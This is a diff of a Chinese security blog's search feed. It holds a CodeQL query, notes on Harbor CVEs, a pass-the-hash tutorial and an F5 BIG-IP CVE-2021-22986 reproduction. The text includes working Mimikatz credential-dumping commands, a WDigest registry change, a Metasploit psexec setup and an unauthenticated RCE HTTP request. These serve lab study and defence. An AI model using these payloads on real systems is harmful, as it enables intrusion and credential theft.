+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Auth Chris Smowton</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">private predicate <span class="title function_">isVarargsParam</span><span class="params">(Parameter p)</span> &#123;</span><br><span class="line">  exists(ParameterDecl pd, FuncTypeExpr tp | pd = tp.getAParameterDecl() |</span><br><span class="line">    p.getDeclaration() = pd.getANameExpr() and</span><br><span class="line">    pd.getTypeExpr() instanceof Ellipsis</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaintConfig</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  TaintConfig() &#123; this = <span class="string">&quot;taint-configuration&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node source, DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Parameter p, DataFlow::ArgumentNode an, <span class="type">int</span> idx |</span><br><span class="line">      an = source and</span><br><span class="line">      p = an.getCall().getACallee().getAParameter() and</span><br><span class="line">      isVarargsParam(p) and</span><br><span class="line">      not an.getCall().hasEllipsis() and</span><br><span class="line">      an.argumentOf(_, idx) and</span><br><span class="line">      idx &gt;= p.getIndex() and</span><br><span class="line">      sink.asParameter() = p</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样虽然可以跟踪隐式数组，但只有当数组本身为污染源才行，对其内的某个元素不起作用。</p>
+<h2 id="CVE-2019-19029"><a href="#CVE-2019-19029" class="headerlink" title="CVE-2019-19029"></a>CVE-2019-19029</h2><p>漏洞版本： 1.7.*、&lt;1.8.6、&lt;1.9.3</p>
+<blockquote>
+<p>具有项目管理能力的用户可以利用和利用SQL注入从底层数据库读取机密或执行权限提升。</p>
+</blockquote>
+<p><code>src/core/auth/authproxy/auth.go</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182225446.png" alt="image-20221026105816087"></p>
+<p><code>src/common/dao/group/usergroup.go</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226507.png" alt="image-20221026110058779"></p>
+<p>这个问题看代码是当用户验证为<code>AuthProxy/OIDC</code>时，控制请求返回值构造 sql 注入 </p>
+<h2 id="CVE-2020-13788"><a href="#CVE-2020-13788" class="headerlink" title="CVE-2020-13788"></a>CVE-2020-13788</h2><p>漏洞版本： 1.8.*、1.9.*、&lt;2.0.1</p>
+<blockquote>
+<p>一个有限的服务器端请求伪造 (SSRF)，它允许 Harbor 项目所有者扫描 Harbor 服务器内部网络上主机的 TCP 端口。</p>
+</blockquote>
+<p><code>src/common/utils/registry/repository.go</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182225933.png" alt="image-20221026154810093"></p>
+<p>codeql 可以跑出来</p>
+<p>当创建项目后，添加 webhook 需要指定<code>Endpoint URL</code>导致的有限 SSRF</p>
+<h2 id="CVE-2020-29662"><a href="#CVE-2020-29662" class="headerlink" title="CVE-2020-29662"></a>CVE-2020-29662</h2><p>漏洞版本： 2.0.0&gt; x &lt;2.0.5、&lt;2.1.2</p>
+<blockquote>
+<p>  api 权限绕过，<code>/v2/_catalog</code> 本意需要管理员权限，但正则写的有问题导致可以使用 <code>/v2/_catalog/ </code>绕过</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226578.png" alt="image-20221026155946894"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226471.png" alt="image-20221026160127001"></p>
+<p>修复<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226728.png" alt="image-20221026160301763"></p>
+<h2 id="CVE-2022-xxx"><a href="#CVE-2022-xxx" class="headerlink" title="CVE-2022-xxx"></a>CVE-2022-xxx</h2><p>CVE-2022-31667 <code>机器人权限可以被无权访问的用户关闭</code> <code>PUT /robots/&#123;robot_id&#125;</code></p>
+<p>CVE-2022-31669  <code>更新标签不变性策略时，没有验证用户权限</code>  <code>PUT /projects/&#123;project_name_or_id&#125;/immutabletagrules/&#123;immutable_rule_id&#125;</code></p>
+<p>CVE-2022-31670 <code>更新标签保留策略时，没有验证用户权限</code>  <code>PUT /retentions/&#123;id&#125;</code></p>
+<p>CVE-2022-31666  <code> 查看/更新/删除 Webhook时，没有验证用户权限</code>   <code>GET/PUT/DELETE /projects/&#123;project_name_or_id&#125;/webhook/policies/&#123;webhook_policy_id&#125;</code> </p>
+<p>CVE-2022-31671  <code>更新/查看P2P preheat execution 日志没有验证用户权限</code> <code>GET /projects/&#123;project_name&#125;/preheat/policies/&#123;preheat_policy_name&#125;/executions/&#123;execution_id&#125;/tasks/&#123;task_id&#125;/logs</code></p>
+<p><code>PUT /projects/&#123;project_name&#125;/preheat/policies/&#123;preheat_policy_name&#125;</code></p>
+<p>这。。。。。。</p>
+]]></content>
+      <categories>
+        <category>漏洞分析 - CNCF</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>CNCF</tag>
       </tags>
   </entry>
   <entry>
@@ -1399,61 +1502,6 @@
       </tags>
   </entry>
   <entry>
-    <title>哈希传递</title>
-    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<blockquote>
-<p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p>
-<p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p>
-</blockquote>
-<h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
-<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
-<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
-
-<p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
-<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
-<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p>
-<p>将一台win7添加到域控（win8）中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160244.png" alt="image-20210214145116625"></p>
-<p>登录一下域账户，之后退出域账户，然后切换为本地账户</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160250.png" alt="image-20210214145726732"></p>
-<p>切换本地账户</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160257.png" alt="image-20210214145957319"></p>
-<h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160302.png" alt="image-20210214152209729"></p>
-<p>获取终端</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:4075bdc2e63781b034a034102356063a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160306.png" alt="image-20210214152128620"></p>
-<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160310.png" alt="image-20210214152835360"></p>
-<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
-<p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 172.16.27.10</span><br><span class="line">set smbuser administrator</span><br><span class="line">set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160316.png" alt="image-20210214154108503"></p>
-<p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
-<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p>
-<p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p>
-<blockquote>
-<p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p>
-<p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
-<p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
-</blockquote>
-<h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160322.png" alt="image-20210214155950651"></p>
-<p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>初探Java反序列化漏洞(二)</title>
     <url>/2021/05/02/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/</url>
     <content><![CDATA[<blockquote>
@@ -1663,6 +1711,63 @@
       </tags>
   </entry>
   <entry>
+    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
+    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
+    <content><![CDATA[<blockquote>
+<p>  燕子来时新社，梨花落后清明。</p>
+</blockquote>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
+<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
+<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
+<thead>
+<tr>
+<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
+<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
+<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
+<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
+<td>F5 BIG-IQ 6.0.0-6.1.0</td>
+</tr>
+</tbody></table>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
+<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
+<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
+<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
+<blockquote>
+<p>图形化漏洞利用工具已更新</p>
+<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
+<p>V1.1 </p>
+<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
+<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
+</blockquote>
+<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
+<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
+<p>运行即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>简单dockers逃逸学习</title>
     <url>/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h2 id="1-目标界面"><a href="#1-目标界面" class="headerlink" title="1. 目标界面"></a>1. 目标界面</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"></p>
@@ -1757,63 +1862,6 @@
       <tags>
         <tag>内网渗透</tag>
         <tag>docker逃逸</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
-    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
-    <content><![CDATA[<blockquote>
-<p>  燕子来时新社，梨花落后清明。</p>
-</blockquote>
-<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
-<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
-<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
-<thead>
-<tr>
-<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
-<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
-<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
-<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
-<td>F5 BIG-IQ 6.0.0-6.1.0</td>
-</tr>
-</tbody></table>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
-<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
-<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
-<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
-<blockquote>
-<p>图形化漏洞利用工具已更新</p>
-<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
-<p>V1.1 </p>
-<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
-<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
-</blockquote>
-<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
-<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
-<p>运行即可。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
